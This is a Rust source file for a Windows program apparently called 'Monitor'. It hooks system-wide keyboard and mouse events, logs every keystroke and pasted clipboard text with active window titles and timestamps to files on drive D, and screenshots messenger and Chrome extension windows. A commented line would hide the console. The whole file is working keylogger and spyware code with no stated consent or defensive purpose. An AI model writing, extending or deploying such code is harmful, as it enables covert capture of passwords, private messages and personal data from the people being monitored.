// #![windows_subsystem = "windows"]
use arboard::Clipboard;
use core::mem::MaybeUninit;
use winapi::um::winuser;
use std::fs;
use std::path::PathBuf;
use chrono::{Utc, DateTime};
use std::sync::Mutex;
use once_cell::sync::Lazy;
use active_win_pos_rs::{ActiveWindow, get_active_window};
use monitor::*;

static LOG_FILE: Lazy<Mutex<String>> = Lazy::new(|| Mutex::new(String::new()));
static LOGGED: Lazy<Mutex<bool>> = Lazy::new(|| Mutex::new(false));
static CTRL_HOLDED: Lazy<Mutex<bool>> = Lazy::new(|| Mutex::new(false));

fn main() {
    #[derive(Copy, Clone, Eq, PartialEq, Debug)]
    enum Events {
        ClickTrayIcon,
        DoubleClickTrayIcon,
        Item1,
        Item2,
        Item3,
    }

    let mut path = PathBuf::from("D:\\");
    path.push("_documents");
    if !path.exists() {
        match fs::create_dir("D:\\_documents") {
            Ok(..) => {
                match fs::create_dir("D:\\_documents/logs") {
                    Ok(..) => (),
                    Err(..) => {
                        print!("failed to create documents/logs folders.");
                    }
                };
                match fs::create_dir("D:\\_documents/screens") {
                    Ok(..) => (),
                    Err(..) => {
                        print!("failed to create documents/screens folders.");
                    }
                };
            },
            Err(..) => {
                print!("failed to create documents folders.");
                std::process::exit(0);
            }
        };
    }

    let now: DateTime<Utc> = Utc::now();
    let fname = now.format("%Y-%m-%d").to_string();
    *LOG_FILE.lock().unwrap() = append_logs(&fname, "log.txt");

    let (s, r) = std::sync::mpsc::channel::<Events>();
    let icon = include_bytes!("./resources/appicon_128x128.ico");

    // Needlessly complicated tray icon with all the whistles and bells
    let mut tray_icon = TrayIconBuilder::new()
        .sender(s)
        .icon_from_buffer(icon)
        .tooltip("Monitor")
        .on_click(Events::ClickTrayIcon)
        .on_double_click(Events::DoubleClickTrayIcon)
        .menu(
            MenuBuilder::new()
                .item("Activity", Events::Item1)
                .item("Logs", Events::Item2)
                .item("Screens", Events::Item3)
        )
        .build()
        .unwrap();

    std::thread::spawn(move || {
        if let Err(error) = listen(track) {
            println!("Error: {:?}", error)
        }
    });
    std::thread::spawn(move || {
        r.iter().for_each(|m| match m {
            Events::DoubleClickTrayIcon => {}
            Events::ClickTrayIcon => {}
            Events::Item1 => {
                let my = LoginWindow::new();
                if let Err(e) = my.wnd.run_main(None) {
                    eprintln!("{}", e);
                }
            }
            Events::Item2 => {
                let my = DocumentWindow::new();
                if let Err(e) = my.wnd.run_main(None) {
                    eprintln!("{}", e);
                }
            }
            Events::Item3 => {
                let my = MyWindow::new();
                if let Err(e) = my.wnd.run_main(None) {
                    eprintln!("{}", e);
                }
            }
        })
    });

    loop {
        unsafe {
            let mut msg = MaybeUninit::uninit();
            let bret = winuser::GetMessageA(msg.as_mut_ptr(), 0 as _, 0, 0);
            if bret > 0 {
                winuser::TranslateMessage(msg.as_ptr());
                winuser::DispatchMessageA(msg.as_ptr());
            } else {
                break;
            }
        }
    }
}

fn track(event: Event) {
    match event.event_type {
        EventType::KeyPress(Key::Alt | Key::AltGr) => println!("Alt!"),
        EventType::KeyPress(Key::CapsLock) => println!("CapsLock!"),
        EventType::KeyPress(Key::ControlLeft | Key::ControlRight) => {
            *CTRL_HOLDED.lock().unwrap() = true;
        },
        EventType::KeyRelease(Key::ControlLeft | Key::ControlRight) => {
            *CTRL_HOLDED.lock().unwrap() = false;
        }
        EventType::KeyPress(Key::Delete) => println!("Delete!"),
        EventType::KeyPress(Key::DownArrow | Key::UpArrow | Key::LeftArrow | Key::RightArrow) => println!("Up/Down/Left/Right!"),
        EventType::KeyPress(Key::Home) => println!("Home!"),
        EventType::KeyPress(Key::Insert) => println!("Insert!"),
        EventType::KeyPress(Key::End) => println!("End!"),
        EventType::KeyPress(Key::Escape) => println!("Escape!"),
        EventType::KeyPress(Key::F1 | Key::F2 | Key::F3 | Key::F4 | Key::F5 | Key::F6 | Key::F7 | Key::F8 | Key::F9 | Key::F10 | Key::F11 | Key::F12) => println!("Fn!"),
        EventType::KeyPress(Key::MetaLeft | Key::MetaRight) => println!("Meta Left/Right!"),
        EventType::KeyPress(Key::ShiftLeft | Key::ShiftRight) => println!("Shift Left/Right!"),
        EventType::KeyPress(Key::PageUp | Key::PageDown) => println!("Page Up/Down!"),
        EventType::KeyPress(Key::ScrollLock | Key::NumLock) => println!("NumLock!"),
        EventType::KeyPress(Key::Pause | Key::PrintScreen) => println!("PrintScreen!"),
        EventType::KeyPress(Key::Slash) => {
            *LOG_FILE.lock().unwrap() += "/";
            *LOGGED.lock().unwrap() = false;
        },
        EventType::KeyPress(Key::BackSlash) => {
            *LOG_FILE.lock().unwrap() += "\\";
            *LOGGED.lock().unwrap() = false;
        },
        EventType::KeyPress(Key::Return) => {
            let now = Utc::now();
            let x: String = format!("{}", now);
            let now_parsed: DateTime<Utc> = x.parse().unwrap();

            match get_active_window() {
                Ok(active_window) => {
                    let info: String = format!("==={}|{}\n", active_window.title, now_parsed.to_string());
                    *LOG_FILE.lock().unwrap() += &info;
                    let logs = LOG_FILE.lock().unwrap().clone();

                    match do_logs(logs) {
                        Ok(_) => {
                            *LOGGED.lock().unwrap() = true;
                            println!("Text written to logs.")
                        },
                        Err(e) => println!("Error: {e:?}"),
                    };

                    capture_screen(active_window);
                },
                Err(()) => {
                    println!("error occurred while getting the active window");
                }
            }
        },
        EventType::KeyPress(Key::Unknown(_u32)) => println!("Unknown key!"),
        EventType::KeyPress(key) => {
            let _key = event.name.unwrap();

            if CTRL_HOLDED.lock().unwrap().clone() {
                match key {
                    Key::KeyV => {
                        let mut clipboard = Clipboard::new().unwrap();
                        *LOG_FILE.lock().unwrap() += &clipboard.get_text().unwrap();
                        // let the_string = "Hello, world!";
                        // clipboard.set_text(the_string).unwrap();
                        // println!("But now the clipboard text should be: \"{}\"", the_string);
                    },
                    _ => {}
                }
            } else {
                *LOG_FILE.lock().unwrap() += &_key;
                *LOGGED.lock().unwrap() = false;
            }
        },
        EventType::ButtonPress(button) => match button {
            Button::Left => {
                if !LOGGED.lock().unwrap().clone() {
                    let now = Utc::now();
                    let x: String = format!("{}", now);
                    let now_parsed: DateTime<Utc> = x.parse().unwrap();

                    match get_active_window() {
                        Ok(active_window) => {
                            let info: String = format!("==={}|{}\n", active_window.title, now_parsed.to_string());
                            *LOG_FILE.lock().unwrap() += &info;
                            let logs = LOG_FILE.lock().unwrap().clone();
                            match do_logs(logs) {
                                Ok(_) => {
                                    *LOGGED.lock().unwrap() = true;
                                    println!("Text written to logs.")
                                },
                                Err(e) => println!("Error: {e:?}"),
                            };
                            capture_screen(active_window);
                        },
                        Err(()) => {
                            println!("error occurred while getting the active window");
                        }
                    }
                } else {
                    match get_active_window() {
                        Ok(active_window) => {
                            let now = Utc::now();
                            let x: String = format!("{}", now);
                            let now_parsed: DateTime<Utc> = x.parse().unwrap();
                            let info: String = format!("{}|{}\n", active_window.title, now_parsed.to_string());
                            *LOG_FILE.lock().unwrap() += &info;
                            let logs = LOG_FILE.lock().unwrap().clone();
                            match do_logs(logs) {
                                Ok(_) => {
                                    *LOGGED.lock().unwrap() = true;
                                    println!("Text written to logs.")
                                },
                                Err(e) => println!("Error: {e:?}"),
                            };
                        },
                        Err(()) => {
                            println!("error occurred while getting the active window");
                        }
                    }
                }
            },
            Button::Middle => (),
            Button::Right => {
                match get_active_window() {
                    Ok(active_window) => {
                        capture_screen(active_window);
                    },
                    Err(()) => {
                        println!("error occurred while getting the active window");
                    }
                }
            },
            Button::Unknown(..) => (),
        },
        EventType::MouseMove{..} => (),
        _ => (),
    }
}

fn capture_screen(active_window: ActiveWindow) {
    let is_extensions = active_window.title == "" && active_window.app_name == "Google Chrome";
    if is_messengers(active_window.title) || is_extensions {
        let screens = Screen::all().unwrap();

        for screen in screens {
            // let image = screen.capture().unwrap();
            let image = screen.capture_area(
                active_window.position.x as i32,
                active_window.position.y as i32,
                active_window.position.width as u32,
                active_window.position.height as u32
            ).unwrap();
            image
                .save(format!("temp.png"))
                .unwrap();

            match append_screenshots() {
                Ok(_) => println!("Screenshots written to logs."),
                Err(e) => println!("Error: {e:?}"),
            };
        }
    }
}